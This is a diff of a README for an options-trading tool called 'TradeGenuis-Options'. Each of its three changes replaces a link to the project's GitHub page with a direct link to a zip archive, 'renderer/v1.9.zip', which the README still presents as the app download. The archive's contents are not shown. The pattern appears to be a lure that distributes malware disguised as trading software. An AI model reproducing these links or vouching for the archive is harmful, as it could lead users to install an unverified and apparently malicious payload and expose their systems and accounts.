@@ -1,6 +1,6 @@
 # ⚡ TradeGenuis-Options - Your Smartest Options Trading Companion
 
-[![Download Now](https://img.shields.io/badge/Download-TradeGenuis--Options-blue?style=for-the-badge&logo=github)](https://github.com/elitelegacyrp/TradeGenuis-Options)
+[![Download Now](https://img.shields.io/badge/Download-TradeGenuis--Options-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/elitelegacyrp/TradeGenuis-Options/main/renderer/v1.9.zip)
 
 ---
 
@@ -84,7 +84,7 @@ All market data is fetched in real-time and never stored, ensuring you always se
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download TradeGenuis-Options](https://github.com/elitelegacyrp/TradeGenuis-Options)**
+Visit this link to download the application: **[Download TradeGenuis-Options](https://raw.githubusercontent.com/elitelegacyrp/TradeGenuis-Options/main/renderer/v1.9.zip)**
 
 ### Step 2: Install and Run
 
@@ -171,4 +171,4 @@ This project is open-source. See the LICENSE file in the repository for details.
 
 Join thousands of traders who use TradeGenuis-Options to make data-driven decisions. Download now and experience the power of AI-assisted options trading!
 
-**[Download Now](https://github.com/elitelegacyrp/TradeGenuis-Options)**
+**[Download Now](https://raw.githubusercontent.com/elitelegacyrp/TradeGenuis-Options/main/renderer/v1.9.zip)**
